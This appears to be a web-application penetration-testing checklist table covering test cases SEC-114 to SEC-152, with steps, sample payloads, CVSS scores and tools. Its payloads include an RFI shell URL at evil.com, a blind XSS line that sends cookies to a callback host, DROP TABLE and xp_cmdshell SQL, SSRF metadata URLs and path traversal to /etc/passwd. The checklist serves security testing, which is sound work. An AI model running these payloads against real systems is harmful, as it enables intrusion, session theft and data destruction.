| SEC-114 | Infrastructure Vulnerability Assessment | Security Misconfiguration (WSTG-CONF-01) | Vulnerability Scanning | 1. Scan server infrastructure for known vulnerabilities.<br>2. Check open ports and services.<br>3. Verify OS patch levels.<br>4. Check web server and application server versions.<br>5. Test for default credentials. | Server infrastructure must be patched to current levels with no unnecessary services exposed and no default credentials. | <code>Run Nessus or OpenVAS scan;run Nmap service detection;check for default credentials;verify patch levels</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Nessus;OpenVAS;Nmap;Metasploit | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-115 | SSL/TLS Vulnerability Scanning | Cryptography (WSTG-CRYP-01) | Vulnerability Scanning | 1. Scan for known SSL/TLS vulnerabilities.<br>2. Check for Heartbleed and POODLE and BEAST and CRIME and BREACH.<br>3. Check for ROBOT vulnerability.<br>4. Verify OCSP stapling.<br>5. Check for certificate transparency. | Application must be free from all known SSL/TLS vulnerabilities with proper certificate transparency and OCSP stapling. | <code>Run testssl.sh;SSLscan;Qualys SSL Labs test;check for CVE-2014-0160;CVE-2014-3566;CVE-2011-3389</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | testssl.sh;SSLscan;Qualys SSL Labs;Nmap | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| SEC-116 | Web Application Firewall Effectiveness | Security Misconfiguration (WSTG-CONF-01) | Vulnerability Scanning | 1. Test WAF detection and effectiveness.<br>2. Send common attack payloads and verify blocking.<br>3. Test WAF bypass techniques.<br>4. Check WAF mode (detection vs blocking).<br>5. Verify WAF logging. | WAF must effectively block common attack patterns while minimizing false positives and must log all blocked requests. | <code>Send OWASP Top 10 payloads through WAF;test bypass techniques;verify blocking mode;check WAF logs</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;WAF bypass tools;Nuclei;Custom Scripts | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-117 | Container Security Scanning | Security Misconfiguration (WSTG-CONF-01) | Vulnerability Scanning | 1. Scan container images for vulnerabilities.<br>2. Check for running as root.<br>3. Verify no sensitive data in container layers.<br>4. Check for exposed secrets in Dockerfiles.<br>5. Verify minimal base images. | Container images must be free from critical vulnerabilities with minimal base images and no hardcoded secrets or root user execution. | <code>Run Trivy;Clair;Anchore on container images;check Dockerfile for secrets;verify USER directive</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Trivy;Clair;Anchore;Hadolint | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-118 | API Security Scanning | Vulnerability Assessment (WSTG-INFO-08) | Vulnerability Scanning | 1. Import API specification (OpenAPI/Swagger).<br>2. Run automated API security tests.<br>3. Check for broken authentication and authorization.<br>4. Test for injection vulnerabilities in all endpoints.<br>5. Verify rate limiting on all APIs. | All API endpoints must be free from OWASP API Security Top 10 vulnerabilities including BOLA and broken authentication. | <code>Import OpenAPI spec into Burp Suite;run API-specific scans;test for BOLA on all endpoints;verify authentication on every endpoint</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;OWASP ZAP;Postman;Dredd | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-119 | Cloud Configuration Security Assessment | Security Misconfiguration (WSTG-CONF-01) | Vulnerability Scanning | 1. Scan cloud infrastructure configuration.<br>2. Check for publicly accessible storage buckets.<br>3. Verify IAM policies follow least privilege.<br>4. Check security group rules.<br>5. Verify encryption settings. | Cloud infrastructure must follow security best practices with no public storage exposure and least privilege IAM and proper encryption. | <code>Run ScoutSuite;Prowler;CloudSploit;check S3 buckets;verify IAM policies;check security groups</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | ScoutSuite;Prowler;CloudSploit;AWS CLI | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-120 | Authentication Bypass Testing | Authentication (WSTG-ATHN-01) | Penetration Testing | 1. Test for default credentials on all login interfaces.<br>2. Test for authentication bypass via SQL injection.<br>3. Test for parameter manipulation to bypass auth.<br>4. Check for forced browsing to authenticated pages.<br>5. Test for session fixation. | Application must resist all authentication bypass attempts and enforce proper authentication on every request to protected resources. | <code>Test admin:admin;admin:password;root:root;test SQL injection bypass ' OR 1=1--;test direct URL access to protected pages</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Hydra;Custom Scripts | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| SEC-121 | Privilege Escalation Testing | Broken Access Control (WSTG-AUTHZ-02) | Penetration Testing | 1. Login as a low-privileged user.<br>2. Attempt to access admin functionality.<br>3. Modify role or privilege parameters.<br>4. Test horizontal privilege escalation between same-level users.<br>5. Test vertical escalation to admin. | Application must enforce proper authorization on all operations preventing both vertical and horizontal privilege escalation. | <code>Change role=user to role=admin in JWT or request;access /admin/&#42; endpoints;modify user_id to access other users' data</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;jwt_tool;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| SEC-122 | Session Management Testing | Session Management (WSTG-SESS-01) | Penetration Testing | 1. Analyze session token generation entropy.<br>2. Test for session fixation.<br>3. Test session timeout.<br>4. Verify session invalidation on logout.<br>5. Test concurrent session handling.<br>6. Check for session in URL. | Application must implement secure session management with high-entropy tokens and proper timeout and invalidation and no URL-based sessions. | <code>Analyze session token with Burp Sequencer;test session reuse after logout;check for session in URL parameters;test concurrent sessions</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Sequencer;Custom Scripts | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| SEC-123 | Business Logic Flaw Testing | Business Logic (WSTG-BUSL-01) | Penetration Testing | 1. Map application workflows and business processes.<br>2. Test for logic bypass by skipping steps.<br>3. Test for race conditions on critical operations.<br>4. Test negative values and boundary conditions.<br>5. Test parameter tampering on business-critical values. | Application must enforce business logic server-side with proper validation of workflow sequences and value constraints. | <code>Skip payment step in checkout;submit negative quantities;modify prices client-side;bypass approval workflows;exploit race conditions</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Turbo Intruder;Custom Scripts | CWE-840; PortSwigger Business logic |
| SEC-124 | Server-Side Request Forgery Deep Testing | SSRF (WSTG-INPV-19) | Penetration Testing | 1. Identify all URL input points.<br>2. Test with internal IP ranges.<br>3. Test with cloud metadata URLs.<br>4. Test with DNS rebinding.<br>5. Test with URL scheme variations.<br>6. Test for blind SSRF. | Application must validate and restrict all server-side URL fetching to prevent access to internal resources and cloud metadata. | <code>url=http://169.254.169.254;url=http://metadata.google.internal;url=http://[::ffff:169.254.169.254];url=http://0x7f000001;url=gopher://</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator;SSRFMap | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| SEC-125 | File Inclusion Testing (LFI/RFI) | Path Traversal (WSTG-INPV-10) | Penetration Testing | 1. Identify file inclusion parameters.<br>2. Test for Local File Inclusion using path traversal.<br>3. Test for Remote File Inclusion with external URLs.<br>4. Test with PHP wrappers and filters.<br>5. Test with null byte termination. | Application must validate file inclusion parameters against a whitelist and never use user input directly in file operations. | <code>page=../../../etc/passwd;file=php://filter/convert.base64-encode/resource=config.php;include=http://evil.com/shell.php</code> | Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;LFISuite;Custom Scripts | CWE-22; [Path Traversal kit](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai |
| SEC-126 | Insecure Deserialization Testing | Injection (WSTG-INPV-08) | Penetration Testing | 1. Identify serialized data in cookies and parameters and APIs.<br>2. Detect serialization format.<br>3. Generate malicious serialized objects.<br>4. Test for remote code execution.<br>5. Test for object manipulation. | Application must avoid deserializing untrusted data and implement type-safe deserialization with integrity checks. | <code>Java ysoserial payloads;PHP PHPGGC chains;Python pickle exploits;.NET ObjectStateFormatter gadgets;Ruby Marshal</code> | Insecure deserialization -&gt; remote code execution. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | ysoserial;PHPGGC;Burp Suite;Custom Scripts | CWE-502; [Deserialization kit](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial |
| SEC-127 | Mass Assignment Testing | Mass Assignment (WSTG-INPV-01) | Penetration Testing | 1. Identify all API endpoints that accept object creation or update.<br>2. Add unexpected parameters like role and admin and verified.<br>3. Test with nested objects.<br>4. Check for parameter binding vulnerabilities. | Application must whitelist allowed parameters for each operation and reject any unauthorized additional parameters. | <code>Add role=admin&amp;is_verified=true&amp;is_superuser=true&amp;account_balance=999999 to registration and profile update requests</code> | Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman;Arjun | CWE-915; [IDOR kit](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA |
| SEC-128 | API Security Testing | Broken Access Control (WSTG-AUTHZ-04) | Penetration Testing | 1. Map all API endpoints.<br>2. Test BOLA on every object-level endpoint.<br>3. Test BFLA on function-level endpoints.<br>4. Check for excessive data exposure.<br>5. Test for lack of resource and rate limiting. | All API endpoints must enforce proper object-level and function-level authorization with data minimization and rate limiting. | <code>Test GET /api/users/{id} with different IDs;test admin endpoints with user tokens;check for excessive data in responses</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman;OWASP ZAP | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| SEC-129 | WebSocket Security Testing | Injection (WSTG-INPV-01) | Penetration Testing | 1. Identify WebSocket endpoints.<br>2. Test authentication on WebSocket connections.<br>3. Test for injection via WebSocket messages.<br>4. Test for CSWSH (Cross-Site WebSocket Hijacking).<br>5. Test message integrity. | WebSocket connections must be authenticated and authorized with input validation on all messages and CSRF protection. | <code>Test ws:// without auth;send injection payloads via WS;test CSWSH from cross-origin;test message tampering</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;wscat;OWASP ZAP | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| SEC-130 | GraphQL Security Testing | Injection (WSTG-INPV-01) | Penetration Testing | 1. Test for introspection query availability.<br>2. Check for query depth limits.<br>3. Test for field-level authorization.<br>4. Test for batch query abuse.<br>5. Test for injection in variables. | GraphQL endpoints must disable introspection in production and implement query depth limiting and field-level authorization. | <code>{__schema{types{name}}};deeply nested queries;batch queries;injection in variables;alias-based DOS</code> | GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;InQL;GraphQL Voyager;Altair | CWE-400; [IDOR kit](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger |
| SEC-131 | Audit Log Completeness Verification | Logging (WSTG-CONF-09) | Security Audit Logs | 1. Perform various security-relevant actions like login and logout and data changes and admin operations.<br>2. Check if each action is logged.<br>3. Verify log entry contains timestamp and user and action and IP and result.<br>4. Test for missing log entries. | Security audit logs must capture all security-relevant events with sufficient detail including timestamp and user and action and source IP and outcome. | <code>Perform login;failed login;password change;data modification;admin action;check each generates audit log entry with all required fields</code> | Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Manual Review;Log Analysis Tools | CWE-778; OWASP Logging &amp; Monitoring Failures (A09) |
| SEC-132 | Audit Log Tampering Prevention | Logging (WSTG-CONF-09) | Security Audit Logs | 1. Access the audit log storage.<br>2. Attempt to modify or delete log entries.<br>3. Check if logs are append-only.<br>4. Verify log integrity protection like checksums or signatures.<br>5. Test for log injection. | Audit logs must be tamper-proof with append-only storage and integrity verification and access controls preventing unauthorized modification. | <code>Attempt DELETE /api/admin/audit-logs/LOG-001;attempt PUT to modify log entries;check for write-once storage</code> | Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Manual Review | CWE-778; OWASP Logging &amp; Monitoring Failures (A09) |
| SEC-133 | Audit Log Injection Prevention | Injection (WSTG-INPV-15) | Security Audit Logs | 1. Perform actions with log injection payloads in parameters.<br>2. Include newline characters and fake log entries.<br>3. Include ANSI escape sequences.<br>4. Test for log forging.<br>5. Verify log sanitization. | Application must sanitize all data written to audit logs to prevent log injection and log forging attacks. | <code>username=admin%0a[SUCCESS] Admin login from 1.2.3.4%0a;action=test\n[2025-01-01] FAKE ADMIN ACTION;include ANSI codes</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| SEC-134 | Audit Log Access Control | Broken Access Control (WSTG-AUTHZ-02) | Security Audit Logs | 1. Attempt to access audit logs as a regular user.<br>2. Check if log viewing is restricted to admin roles.<br>3. Test for IDOR on individual log entries.<br>4. Verify role-based log access. | Audit logs must be accessible only to authorized security and admin roles with proper access controls on all log endpoints. | <code>GET /api/audit-logs with regular user token;GET /api/admin/audit-logs;GET /api/audit-logs?user_id=1002</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| SEC-135 | Sensitive Data in Audit Logs | Information Disclosure (WSTG-INFO-05) | Security Audit Logs | 1. Trigger logging of sensitive operations.<br>2. Review log entries for plaintext passwords or tokens or credit card numbers.<br>3. Check if PII is masked in logs.<br>4. Verify log data classification. | Audit logs must not contain sensitive data like plaintext passwords or full credit card numbers and must mask PII appropriately. | <code>Check logs for password=plaintext;session_token=full_value;credit_card=full_number;ssn=unmasked after performing auth operations</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Manual Review;Log Analysis Tools | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| SEC-136 | Audit Log Denial of Service | Business Logic (WSTG-BUSL-05) | Security Audit Logs | 1. Generate a massive volume of log-worthy events rapidly.<br>2. Check if logging infrastructure handles high volume.<br>3. Test if log DoS affects application performance.<br>4. Verify log rotation and retention. | Audit log infrastructure must handle high volumes without affecting application performance and implement proper rotation and retention. | <code>Generate 10000+ logged events per minute;check for log storage exhaustion;verify log rotation;check application performance</code> | Denial of service -&gt; availability impact for this feature / the app. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;JMeter;Custom Scripts | CWE-400; [Race Condition kit](#/checklist/racecondition); OWASP; PortSwigger |
| SEC-137 | Audit Log Timestamp Integrity | Logging (WSTG-CONF-09) | Security Audit Logs | 1. Check log timestamps for accuracy.<br>2. Verify timestamps use UTC.<br>3. Check for NTP synchronization.<br>4. Test if client-provided timestamps can influence log entries.<br>5. Verify monotonic ordering. | Audit log timestamps must be generated server-side using synchronized UTC time and not be influenceable by client-provided values. | <code>Compare log timestamps with actual time;check for timezone consistency;verify NTP sync;try modifying client time headers</code> | Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Manual Review;NTP Tools | CWE-778; OWASP Logging &amp; Monitoring Failures (A09) |
| SEC-138 | Audit Log Retention and Archival | Compliance (WSTG-CONF-09) | Security Audit Logs | 1. Check audit log retention policy.<br>2. Verify logs are retained for required compliance period.<br>3. Check if archived logs are encrypted.<br>4. Verify archived logs are accessible for investigation.<br>5. Test log search and retrieval. | Audit logs must be retained for the required compliance period with encrypted archival and searchable retrieval capability. | <code>Verify 1-7 year retention based on compliance;check encrypted archive storage;test log search for historical events</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Manual Review;Log Management Tools | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-139 | Failed Authentication Logging Verification | Logging (WSTG-CONF-09) | Security Audit Logs | 1. Attempt multiple failed logins.<br>2. Verify each failed attempt is logged.<br>3. Check if username and IP and timestamp are captured.<br>4. Verify lockout events are logged.<br>5. Check for rate limiting notification logs. | All failed authentication attempts must be logged with sufficient detail to detect and investigate brute force attacks. | <code>Perform 10 failed logins and verify each appears in logs with username_attempted;source_ip;timestamp;failure_reason</code> | Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Manual Review;Burp Suite | CWE-778; OWASP Logging &amp; Monitoring Failures (A09) |
| SEC-140 | Privilege Change Audit Logging | Logging (WSTG-CONF-09) | Security Audit Logs | 1. Change user roles and permissions.<br>2. Verify privilege escalation events are logged.<br>3. Check if the changed-by user is recorded.<br>4. Verify before and after values are captured.<br>5. Test for admin impersonation logging. | All privilege and role changes must be logged with the initiating user and before/after values for accountability. | <code>Change user role from regular to admin;verify log entry captures who_changed;old_role;new_role;timestamp;justification</code> | Insufficient or injectable logging -&gt; forensic gaps / log injection / audit bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Manual Review;Burp Suite | CWE-778; OWASP Logging &amp; Monitoring Failures (A09) |
| SEC-141 | CSRF via Flash or Silverlight Cross-Domain Policy | CSRF (WSTG-SESS-05) | CSRF Protection | 1. Check for crossdomain.xml file.<br>2. Check for clientaccesspolicy.xml.<br>3. Verify if overly permissive cross-domain policies exist.<br>4. Test if Flash can make authenticated cross-domain requests. | Application must have restrictive cross-domain policies or no crossdomain.xml file to prevent Flash/Silverlight-based CSRF. | <code>Check /crossdomain.xml for allow-access-from domain="&#42;";check /clientaccesspolicy.xml for permissive policies</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Browser;cURL | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| SEC-142 | Blind XSS Detection | Cross-Site Scripting (WSTG-INPV-02) | XSS Prevention | 1. Inject blind XSS payloads in all user input fields.<br>2. Use XSS Hunter or similar callback service.<br>3. Target fields viewed by admin or support staff.<br>4. Include payloads in HTTP headers like User-Agent.<br>5. Wait for callback confirmation. | Application must sanitize all stored data regardless of where it is rendered to prevent blind XSS attacks targeting admin or internal panels. | <code>&gt;&lt;script src=https://xsshunter.xss.ht&gt;&lt;/script&gt;;&gt;&lt;img src=x onerror=fetch('https://callback.xss.ht/'+document.cookie)&gt;;inject in User-Agent and Referer</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | XSS Hunter;Burp Suite;Custom Callback Server | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| SEC-143 | SQL Injection via Stored Procedures | Injection (WSTG-INPV-05) | SQL Injection Prevention | 1. Identify endpoints that invoke stored procedures.<br>2. Test for SQL injection in stored procedure parameters.<br>3. Check for dynamic SQL within stored procedures.<br>4. Test with stacked queries. | Application must use parameterized calls to stored procedures and avoid dynamic SQL within procedures. | <code>exec sp_name 'param1'; DROP TABLE users--;EXEC xp_cmdshell 'dir';'; EXEC sp_msforeachtable 'DROP TABLE ?'--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| SEC-144 | Prototype Pollution Testing | Injection (WSTG-INPV-01) | Input Sanitization | 1. Identify Node.js or JavaScript-based backend.<br>2. Test for prototype pollution via JSON body.<br>3. Inject __proto__ and constructor.prototype payloads.<br>4. Check for privilege escalation or RCE via prototype pollution. | Application must sanitize incoming JSON objects and reject prototype pollution payloads to prevent object manipulation. | <code>{"__proto__":{"isAdmin":true}};{"constructor":{"prototype":{"isAdmin":true}}};{"__proto__":{"shell":"node"}}</code> | Prototype pollution -&gt; DOM XSS (client) / RCE (server). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Scripts;server-side-prototype-pollution | CWE-1321; [Prototype Pollution kit](#/checklist/prototype); Olivier Arteau; PortSwigger server-side PP |
| SEC-145 | Rate Limit Header Manipulation for Reset | Business Logic (WSTG-BUSL-05) | Rate Limiting | 1. Identify rate limit tracking mechanism.<br>2. Attempt to reset rate limit counters via header manipulation.<br>3. Modify session identifier to get fresh rate limit.<br>4. Test with cookie manipulation. | Application must implement rate limiting that cannot be reset through client-side header or cookie manipulation. | <code>Modify session cookie to get new rate limit;add X-Rate-Limit-Reset: 0 header;delete rate limit tracking cookies</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-146 | CAPTCHA Integration Security Assessment | Authentication (WSTG-ATHN-08) | Captcha / reCAPTCHA | 1. Verify CAPTCHA is validated before processing the form.<br>2. Check if form can be processed while CAPTCHA validation is pending.<br>3. Test for race condition between CAPTCHA validation and form processing. | Application must validate CAPTCHA synchronously before processing any form data and not allow race condition bypass. | <code>Submit form and CAPTCHA validation concurrently;cancel CAPTCHA request after form submission;test timing window</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Turbo Intruder | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| SEC-147 | IP Reputation Check Bypass | Security Misconfiguration (WSTG-CONF-01) | IP Blocking | 1. Check if the application uses IP reputation lists.<br>2. Test access from known malicious IPs.<br>3. Test from TOR exit nodes.<br>4. Test from cloud provider IPs.<br>5. Verify reputation database freshness. | Application must use updated IP reputation databases and block known malicious IP ranges while handling cloud and VPN IPs appropriately. | <code>Access from TOR exit node;use known botnet IP ranges;test from cloud provider IPs;check reputation database update frequency</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | TOR;VPN;Cloud Infrastructure;Nmap | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-148 | Device Fingerprint Spoofing | Business Logic (WSTG-BUSL-01) | Fraud Detection | 1. Identify device fingerprinting mechanisms.<br>2. Modify browser fingerprint components.<br>3. Use anti-fingerprint browser extensions.<br>4. Change canvas and WebGL fingerprints.<br>5. Spoof navigator properties. | Application must implement resilient device fingerprinting that cannot be easily spoofed by standard browser manipulation techniques. | <code>Modify navigator.userAgent;spoof canvas fingerprint;change screen resolution;modify WebGL renderer;use antidetect browser</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Browser DevTools;Canvas Fingerprint Spoofer;FingerprintJS | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| SEC-149 | Cross-Origin-Opener-Policy (COOP) Check | Security Misconfiguration (WSTG-CONF-07) | Security Headers | 1. Check for Cross-Origin-Opener-Policy header.<br>2. Verify value is same-origin for sensitive pages.<br>3. Test cross-origin window reference access.<br>4. Verify protection against Spectre-like attacks. | Application must set Cross-Origin-Opener-Policy: same-origin on sensitive pages to isolate browsing contexts and mitigate cross-origin attacks. | <code>Check for Cross-Origin-Opener-Policy header;test window.opener access from cross-origin pages;verify browsing context isolation</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-150 | Cross-Origin-Embedder-Policy (COEP) Check | Security Misconfiguration (WSTG-CONF-07) | Security Headers | 1. Check for Cross-Origin-Embedder-Policy header.<br>2. Verify value is require-corp or credentialless.<br>3. Test cross-origin resource embedding behavior.<br>4. Verify SharedArrayBuffer availability requires COEP. | Application must set Cross-Origin-Embedder-Policy where needed to enable cross-origin isolation for features like SharedArrayBuffer. | <code>Check for Cross-Origin-Embedder-Policy: require-corp;verify cross-origin resource embedding restrictions</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | Low | 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser DevTools | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-151 | CSP Strict-Dynamic Evaluation | Security Misconfiguration (WSTG-CONF-07) | Content Security Policy | 1. Check if CSP uses strict-dynamic.<br>2. Verify nonce propagation to dynamically created scripts.<br>3. Test if strict-dynamic bypasses are possible.<br>4. Check for script gadgets in whitelisted libraries. | CSP strict-dynamic must be properly implemented ensuring only nonced scripts can propagate trust to dynamically loaded scripts. | <code>Check for script-src 'strict-dynamic' 'nonce-xxx';test if document.createElement('script') gets trust;look for gadget chains</code> | Security misconfiguration -&gt; weakened control exploitable via the mapped attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;CSP Evaluator;Browser DevTools | CWE-16; OWASP Security Misconfiguration (A05) |
| SEC-152 | API Response Encryption Assessment | Cryptography (WSTG-CRYP-01) | Encryption (At Rest / In Transit) | 1. Check if sensitive API responses contain encrypted payloads.<br>2. Verify field-level encryption for sensitive data.<br>3. Check for encrypted JWT payloads (JWE).<br>4. Test for data exposure in unencrypted responses. | Sensitive data in API responses must be encrypted at the field level when containing PII or financial data beyond transport-level TLS encryption. | <code>Check API responses for unencrypted ssn;credit_card;health_data fields;verify JWE for sensitive JWTs;test field-level encryption</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
